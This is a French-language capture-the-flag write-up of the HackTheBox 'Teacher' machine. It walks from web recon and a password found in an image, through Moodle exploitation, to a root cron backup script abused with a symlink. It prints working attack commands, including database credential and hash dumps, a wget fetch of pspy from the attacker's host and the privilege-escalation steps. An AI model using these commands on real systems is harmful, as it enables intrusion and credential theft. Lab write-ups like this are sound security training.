\chapter{Teacher}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
TARGET_IP=
$ PORTS=$( sudo nmap --min-rate=1000 -T4 -p- $TARGET_IP | grep '^[0-9]' | 
    cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ sudo nmap -sVC -p$PORTS $TARGET_IP
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Blackhat highschool
|_http-server-header: Apache/2.4.25 (Debian)
\end{verbatim}

\subsubsection{http}

technos:
\begin{verbatim}
$ whatweb http://$TARGET_IP/index.html | tr ',' '\n'
 
 Country[RESERVED][ZZ]
 Email[contact@blackhatuni.com]
 HTML5
 HTTPServer[Debian Linux][Apache/2.4.25 (Debian)]
 IP[10.10.10.153]
 JQuery[1.11.1]
 Script
 Title[Blackhat highschool]
\end{verbatim}

\begin{verbatim}
$ ffuf -u http://10.10.10.153/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -e .txt
$ ffuf -u http://10.10.10.153/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .html

.hta.txt                [Status: 403, Size: 295, Words: 22, Lines: 12, Duration: 26ms]
.hta                    [Status: 403, Size: 291, Words: 22, Lines: 12, Duration: 26ms]
.htaccess.txt           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 37ms]
.htaccess               [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 37ms]
.htpasswd               [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 61ms]
.htpasswd.txt           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 48ms]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 28ms]
fonts                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 30ms]
images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 30ms]
index.html              [Status: 200, Size: 8028, Words: 514, Lines: 250, Duration: 32ms]
javascript              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 27ms]
js                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 35ms]
manual                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 32ms]
moodle                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 26ms]
phpmyadmin              [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 28ms]
server-status           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 28ms]
\end{verbatim}

quand on essaie d'acceder à moodle on est redirect vers
\verb+http://teacher.htb/moodle/+

\begin{verbatim}
$ ffuf -u http://teacher.htb/moodle/FUZZ 
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
    -e .html

search                  [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 39ms]
blog                    [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 59ms]
rss                     [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 47ms]
login                   [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 69ms]
media                   [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 48ms]
files                   [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 70ms]
user                    [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 47ms]
#.html                  [Status: 200, Size: 26871, Words: 1902, Lines: 273, Duration: 1827ms]
calendar                [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 43ms]
admin                   [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 69ms]
comment                 [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 70ms]
report                  [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 44ms]
local                   [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 30ms]
pix                     [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 28ms]
tag                     [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 25ms]
group                   [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 44ms]
my                      [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 41ms]
install                 [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 49ms]
lib                     [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 26ms]
.html                   [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 4452ms]
cache                   [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 35ms]
notes                   [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 36ms]
message                 [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 33ms]
lang                    [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 32ms]
theme                   [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 34ms]
blocks                  [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 37ms]
question                [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 27ms]
portfolio               [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 1423ms]
backup                  [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 40ms]
rating                  [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 27ms]
filter                  [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 25ms]
mod                     [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 27ms]
auth                    [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 42ms]
course                  [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 27ms]
error                   [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 25ms]
badges                  [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 44ms]
repository              [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 30ms]
analytics               [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 34ms]
availability            [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 29ms]
webservice              [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 29ms]
plagiarism              [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 28ms]
.html                   [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 29ms]
                        [Status: 200, Size: 26871, Words: 1902, Lines: 273, Duration: 103ms]
competency              [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 25ms]
\end{verbatim}

\url{http://teacher.htb/moodle/webservice/} est browsable.

\url{http://teacher.htb/moodle/webservice/upgrade.txt} indique visiblement une
version 3.4

\begin{verbatim}
$ python3 ./moodlescan.py -u http://teacher.htb/moodle/

Version 0.8 - May/2021

Getting server information http://teacher.htb/moodle/ ...

server          : Apache/2.4.25 (Debian)
x-frame-options : sameorigin
last-modified   : Tue, 01 Nov 2022 01:24:43 GMT

Getting moodle version...

Version found via /composer.lock : Moodle v3.4.1

Searching vulnerabilities...


Vulnerabilities found: 0

Scan completed.
\end{verbatim}

\begin{verbatim}
$ searchsploit moodle 3.4.1
Moodle 3.4.1 - Remote Code Execution               | php/webapps/46551.php
\end{verbatim}
ok mais il faut un compte

sqli ne semble en premiere intention ne pas fonctionner.

plein de choses essayées mais rien ne fonctionne.

en fait ce que j'ai manqué c'est qu'il y a une image qui ne s'affiche pas sur
les teachers.

Quand on regarde le code source :
\begin{verbatim}
<li><a href="#"><img src="images/5.png" onerror="console.log('That\'s an F');" alt=""></a></li>
\end{verbatim}

donc :
\begin{verbatim}
$ curl -O http://teacher.htb/images/5.png
$ cat 5.png
Hi Servicedesk,

I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.

Could you guys figure out what the last charachter is, or just reset it?

Thanks,
Giovanni
\end{verbatim}

en utilisant burp on trouve \verb+giovanni:Th4C00lTheacha#+

il y a cet exploit 
\begin{verbatim}
$ searchsploit -m 46551
\end{verbatim}

\url{https://blog.sonarsource.com/moodle-remote-code-execution}



\subsection{Foothold}
\subsubsection{www-data}
\begin{verbatim}
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@teacher:/var/www/html/moodle/question$
\end{verbatim}
\url{https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/moodle}
dans la section POST 
\begin{verbatim}
# Find database credentials
find / -name "config.php" 2>/dev/null | grep "moodle/config.php"
Dump Credentials from database
/usr/local/bin/mysql -u <username> --password=<password> \
    -e "use moodle; select email,username,password from mdl_user; exit"
\end{verbatim}


\begin{verbatim}
$CFG->dbtype    = 'mariadb';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'root';
$CFG->dbpass    = 'Welkom1!';
$CFG->prefix    = 'mdl_';
\end{verbatim}

\begin{verbatim}
<select email,username,password from mdl_user; exit"
+----------------+-------------+--------------------------------------------------------------+
| email          | username    | password                                                     |
+----------------+-------------+--------------------------------------------------------------+
| root@localhost | guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
| gio@gio.nl     | admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
| Giio@gio.nl    | giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
|                | Giovannibak | 7a860966115182402ed06375cf0a22af                             |
+----------------+-------------+--------------------------------------------------------------+
\end{verbatim}

on trouve ton \verb+expelled+

\begin{verbatim}
$ su giovanni
su giovanni
Password: expelled

giovanni@teacher:/var/www/html/moodle$
\end{verbatim}

\subsubsection{giovanni}

\begin{verbatim}
$ ls -la work/tmp
ls -la work/tmp
total 16
drwxr-xr-x 3 giovanni giovanni 4096 Mar 21  2022 .
drwxr-xr-x 4 giovanni giovanni 4096 Mar 21  2022 ..
-rwxrwxrwx 1 root     root      259 Nov  1 05:30 backup_courses.tar.gz
drwxrwxrwx 3 root     root     4096 Mar 21  2022 courses
\end{verbatim}

\begin{verbatim}
$ curl -O http://10.10.16.5/pspy64
curl -O http://10.10.16.5/pspy64
bash: curl: command not found
$ wget http://10.10.16.5/pspy64
wget http://10.10.16.5/pspy64
--2022-11-01 05:36:24--  http://10.10.16.5/pspy64
Connecting to 10.10.16.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64              100%[===================>]   2.94M  1.70MB/s    in 1.7s

2022-11-01 05:36:25 (1.70 MB/s) - ‘pspy64’ saved [3078592/3078592]


2022/11/01 05:44:01 CMD: UID=0    PID=4160   | /usr/sbin/CRON -f
2022/11/01 05:44:01 CMD: UID=0    PID=4161   | /usr/sbin/CRON -f
2022/11/01 05:44:01 CMD: UID=0    PID=4162   | /bin/sh -c /usr/bin/backup.sh
2022/11/01 05:44:01 CMD: UID=0    PID=4163   | /bin/bash /usr/bin/backup.sh
2022/11/01 05:44:01 CMD: UID=0    PID=4164   | tar -czvf tmp/backup_courses.tar.gz courses/algebra
2022/11/01 05:44:01 CMD: UID=0    PID=4165   | /bin/sh -c gzip
2022/11/01 05:44:01 CMD: UID=0    PID=4166   | /bin/bash /usr/bin/backup.sh
2022/11/01 05:44:01 CMD: UID=0    PID=4167   | tar -xf backup_courses.tar.gz


ls -l /usr/bin/backup.sh
-rwxr-xr-x 1 root root 138 Jun 27  2018 /usr/bin/backup.sh
giovanni@teacher:~$ cat /usr/bin/backup.sh
cat /usr/bin/backup.sh
#!/bin/bash
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;
\end{verbatim}

\begin{verbatim}
$ mv courses old
mv courses old
giovanni@teacher:~/work$ ln -s /root courses
ln -s /root courses

$ ls tmp/courses
ls tmp/courses
algebra  root  root.txt
\end{verbatim}
\section{Theorie}


